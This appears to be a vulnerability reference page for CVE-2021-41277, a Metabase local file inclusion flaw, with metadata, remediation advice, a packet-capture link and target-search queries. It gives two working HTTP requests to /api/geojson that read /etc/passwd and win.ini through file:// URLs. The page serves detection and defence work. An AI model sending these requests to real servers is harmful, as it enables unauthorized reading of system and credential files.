---
layout: post
cve_id: CVE-2021-41277
title: Metabase - Local File Inclusion
pcap: true
pcap_path: /pcaps/2021/CVE-2021-41277.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-41277.yaml
snort2_rule: N/A
snort3_rule: N/A
author: 0x_Akoko,DhiyaneshDK
severity: high
impact: 'The vulnerability can result in unauthorized access to sensitive files or
  execution of arbitrary code on the affected system.

  '
remediation: 'This issue is fixed in 0.40.5 and .40.5 and higher. If you are unable
  to upgrade immediately, you can mitigate this by including rules in your reverse
  proxy or load balancer or WAF to provide a validation filter before the application.

  '
reference:
- https://github.com/metabase/metabase/security/advisories/GHSA-w73v-6p7p-fpfr
- https://nvd.nist.gov/vuln/detail/CVE-2021-41277
- https://twitter.com/90security/status/1461923313819832324
- https://github.com/metabase/metabase/commit/042a36e49574c749f944e19cf80360fd3dc322f0
- https://github.com/pen4uin/vulnerability-research-list
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
  cvss-score: 7.5
  cve-id: CVE-2021-41277
  cwe-id: CWE-22,CWE-200
  epss-score: 0.94408
  epss-percentile: 0.99974
  cpe: cpe:2.3:a:metabase:metabase:0.40.0:-:*:*:*:*:*:*
metadata:
  max-request: 2
  vendor: metabase
  product: metabase
  shodan-query:
  - http.title:"Metabase"
  - http.title:"metabase"
  fofa-query:
  - app="Metabase"
  - title="metabase"
  - app="metabase"
  google-query: intitle:"metabase"
tags:
- cve2021
- cve
- metabase
- lfi
- kev
- vkev
- vuln
---

## üîç Vulnerability Description
Metabase is an open source data analytics platform. In affected versions a local file inclusion security issue has been discovered with the custom GeoJSON map (`admin->settings->maps->custom maps->add a map`) support and potential local file inclusion (including environment variables). URLs were not validated prior to being loaded.


## üåê HTTP Request
```nohighlight
GET /api/geojson?url=file:///etc/passwd HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.1) Gecko/20100101 Firefox/65.1
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

```nohighlight
GET /api/geojson?url=file:///c://windows/win.ini HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Kubuntu; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

